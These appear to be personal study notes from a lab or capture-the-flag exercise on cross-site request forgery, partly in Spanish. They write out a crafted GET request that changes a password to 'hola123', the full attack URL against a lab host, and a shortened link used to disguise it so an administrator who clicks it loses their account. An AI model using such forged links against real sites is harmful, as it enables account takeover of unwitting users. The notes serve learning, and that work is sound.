

El CSRF es un tipo de exploit malicioso de un sitio web en el que comandos no autorizados son transmitidos por un usuario en el cual el sitio web confía.​ Esta vulnerabilidad es conocida también por otros nombres como XSRF, enlace hostil, ataque de un clic, secuestro de sesión, y ataque automático.


Savitar is doing something with a website. Is changing his password and intercepting the petition. And then is changing the petition from GET , on a option called "change request method" . And the data is incorpored to the get method.



The data was applied on the GET header like this
```
GET /change_pass.php?password=hola123&confirm_password=hola123&submit=submit
```

So, the problem is if another user exists, like administrator... and we change his password.

```
http://10.10.10.123/change_pass.php?password=hola123&confirm_password=hola123&submit=submit
```
but this is suspicious so we are going to search for a URL shortener

So when I access this, or the administrator (??) the password is changed
```
https://shorturl.at/vwzS1
```









